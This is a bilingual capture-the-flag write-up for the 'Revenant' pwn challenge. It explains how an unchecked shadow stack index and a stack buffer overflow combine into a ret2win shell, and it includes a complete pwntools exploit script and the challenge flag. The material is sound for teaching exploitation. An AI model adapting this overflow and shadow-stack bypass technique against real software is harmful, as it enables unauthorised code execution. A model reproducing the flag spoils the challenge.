# Revenant - Midnight Flag CTF 2026

My writeup for the Revenant challenge:

## Description

> Something watches over you in this place. Every step, every decision — recorded, verified. It knows where you've been. It knows where you're going. It cannot be fooled. ...probably.
> [Revenant.zip](Revenant.zip)

## Properties

```
# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
```

## Writeup EN

:flag_fr: *French writeup and exploit below*

The goal is to reach the `win` function, which gives us a shell:

```c
void win(void) {
	puts("You found the light you were looking for. You are saved!");
	execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL); 
}
```

And we quickly spot a stack buffer overflow in the `play` function:

```c
void play(void) {
    shadow_stack_push((uintptr_t)__builtin_return_address(0));
    char buf[32];
    ...
    read(0, buf, 128);
    ...
    if (!shadow_stack_pop((uintptr_t)__builtin_return_address(0))) {
        puts("  [!] Something is wrong with your memory...");
        _exit(1);
    }
}
```

But you can't just do a simple __ret2win__ because the return address of `play` is stored not only on the stack but also in the `.bss` section, and it is compared with the one on the stack before the return. If they are different, the return doesn't happen. This is what's called a [Shadow Stack](https://en.wikipedia.org/wiki/Shadow_stack):

```c
int shadow_stack_pop(uintptr_t ret_addr) {
    if (shadow_stack_base == NULL) {
        fprintf(stderr, "Shadow stack not initialized!\n");
        exit(EXIT_FAILURE);
    }
    if (shadow_stack_ptr == 0) {
        fprintf(stderr, "Shadow stack underflow!\n");
        exit(EXIT_FAILURE);
    }

    uintptr_t stored = shadow_stack[--shadow_stack_ptr];
    return stored == ret_addr;
}
```

We therefore need to find a way to overwrite the return address stored in this shadow stack.

Note that `shadow_stack` is an array of 512 pointers and that `shadow_stack_ptr` serves as its index:

```c
#define SHADOW_STACK_SIZE 512

extern uintptr_t shadow_stack[SHADOW_STACK_SIZE];
extern size_t    shadow_stack_ptr;
```

However, the program never checks that `shadow_stack_ptr < 512`! This means the top of the shadow stack can be moved outside the allocated area! Let's look at the other variables stored in the `.bss` section:

| Address   	| Variable          	|
|-----------	|-------------------	|
| `0x407048` 	| `shadow_stack_base` 	|
| `0x407040` 	| `shadow_stack_ptr`  	|
| `0x407000` 	| `username`          	|
| `0x406000` 	| `shadow_stack`      	|
| `0x405010` 	| `entities`          	|
| `0x40500c` 	| `nights`            	|

By incrementing `shadow_stack_ptr` enough, we can move the top of the stack into the space allocated for the `username` variable—which works out perfectly, since we can write 16 arbitrary bytes there!

```c
read(0, username, 16);
```

So we'll write the 8 bytes of the `win` address inside it.

All that's left is to increment `shadow_stack_ptr`. To do this, we'll take advantage of the _recursion_ of the `play` function via the `do_reset` function!

```c
void play(void) {
	...
	switch (choice) {
		...
        case 4: do_reset();  choice = 0; break;
    }
}

static void do_reset(void) {
    puts("\n  You died. The darkness takes you.\n  But something pulls you back...\n");
    nights = 0;
    new_night();
    play();
}
```

Each recursive call adds a return address to the shadow stack and increments `shadow_stack_ptr`. By making 512 calls (`(0x407000 - 0x406000) / 8`) to the `play` function, the top of the shadow stack reaches `username`, and we can place the address of `win` there. All that's left is to overwrite the return address in the regular stack, and we're done!

## Writeup FR

L'objectif est d'atteindre la fonction `win` qui nous donne un shell :

```c
void win(void) {
	puts("You found the light you were looking for. You are saved!");
	execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL); 
}
```

Et on aperçoit rapidement un Stack Buffer Overflow dans la fonction `play`:

```c
void play(void) {
    shadow_stack_push((uintptr_t)__builtin_return_address(0));
    char buf[32];
    ...
    read(0, buf, 128);
    ...
    if (!shadow_stack_pop((uintptr_t)__builtin_return_address(0))) {
        puts("  [!] Something is wrong with your memory...");
        _exit(1);
    }
}
```

Mais on ne peut pas faire un simple __ret2win__ car l'adresse de retour de `play` est stockée, en plus de la pile, dans la section `.bss` et elle est comparée avec celle de la stack  avant le return. Si elles sont différentes, pas de return. C'est ce qu'on appelle une [Shadow Stack](https://en.wikipedia.org/wiki/Shadow_stack) :

```c
int shadow_stack_pop(uintptr_t ret_addr) {
    if (shadow_stack_base == NULL) {
        fprintf(stderr, "Shadow stack not initialized!\n");
        exit(EXIT_FAILURE);
    }
    if (shadow_stack_ptr == 0) {
        fprintf(stderr, "Shadow stack underflow!\n");
        exit(EXIT_FAILURE);
    }

    uintptr_t stored = shadow_stack[--shadow_stack_ptr];
    return stored == ret_addr;
}
```

Il faut donc faut trouver un moyen de réécrire l'adresse de retour stockée dans cette shadow stack.

On peut remarquer que `shadow_stack` est un tableau de 512 pointeurs et que `shadow_stack_ptr` lui sert d'index :

```c
#define SHADOW_STACK_SIZE 512

extern uintptr_t shadow_stack[SHADOW_STACK_SIZE];
extern size_t    shadow_stack_ptr;
```

Pour autant, le programme ne s'assure jamais que `shadow_stack_ptr < 512` ! On peut donc déplacer le sommet de la shadow stack hors de la zone allouée ! Voyons les autres variables qui sont stockées dans la section `.bss` :

| Adresse   	| Variable          	|
|-----------	|-------------------	|
| `0x407048` 	| `shadow_stack_base` 	|
| `0x407040` 	| `shadow_stack_ptr`  	|
| `0x407000` 	| `username`          	|
| `0x406000` 	| `shadow_stack`      	|
| `0x405010` 	| `entities`          	|
| `0x40500c` 	| `nights`            	|

En incrémentant suffisamment `shadow_stack_ptr` on peut amener le sommet de la pile dans l'espace alloué pour la variable `username` et ça tombe bien car on peut écrire 16 octets arbitraires dedans !

```c
read(0, username, 16);
```

On va donc écrire les 8 octets de l'adresse de `win` à l'intérieur.

Il reste à incrémenter `shadow_stack_ptr`. Pour ça on va profiter de la _récursivité_ de la fonction `play` à travers la fonction `do_reset` !

```c
void play(void) {
	...
	switch (choice) {
		...
        case 4: do_reset();  choice = 0; break;
    }
}

static void do_reset(void) {
    puts("\n  You died. The darkness takes you.\n  But something pulls you back...\n");
    nights = 0;
    new_night();
    play();
}
```

Chaque appel récursif va ajouter une adresse de retour dans la shadow stack et incrémenter `shadow_stack_ptr`. En effectuant 512 appels (`(0x407000 - 0x406000) / 8`) à la fonction `play`, le sommet de la shadow stack atteint `username` et on peut y mettre l'adresse de `win`. Plus qu'à écraser l'adresse de retour dans la pile classique et le tour est joué !

## Exploit

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host dyn-03.midnightflag.fr --port 13448 pub/game
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'pub/game')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'dyn-01.midnightflag.fr'
port = int(args.PORT or 14013)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b * play +181
b * play +186
b * play+332
continue
'''.format(**locals())


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

name = fit(exe.symbols["win"])
padding = 56
shadow_stack_addr = exe.symbols["shadow_stack"]
username_addr = exe.symbols["username"]


ptr_obj = (username_addr - shadow_stack_addr)//8


io = start()

for depth in range(ptr_obj):
    io.sendlineafter(b"Survivor name:\n", name)
    io.sendlineafter(b"[0] Flee", b"4")

io.sendlineafter(b"Survivor name:\n", name)
io.sendlineafter(b"[0] Flee", b"1")
payload = fit({
    padding: exe.symbols["win"],
})
io.sendlineafter(b"(0-255):\n", payload)
io.sendlineafter(b"[0] Flee", b"0")

io.interactive()
```

## Flag

```
MCTF{Wh4t_w4s_th4t_1d3a_t0_Cr3ate_a_userl4nd_sh4dow_st4ck??}
```